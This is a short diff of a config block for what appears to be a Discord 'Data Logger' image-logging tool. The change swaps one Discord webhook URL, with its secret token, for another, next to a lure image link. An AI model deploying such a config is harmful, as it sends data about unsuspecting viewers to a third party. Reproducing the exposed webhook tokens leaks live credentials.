@@ -11,7 +11,7 @@ __version__ = "v4.0"
 __author__ = "Cybersecurity Student"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
+    "webhook": "https://discord.com/api/webhooks/1386756417368752249/ASWh-wwav0RH1LmxiImI2SD900JuBi6RjSQl-I-s_JNjle2NpEcPRr95OJAaHvj-B7Mw",
     "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
     "imageArgument": True,
     "username": "Data Logger",
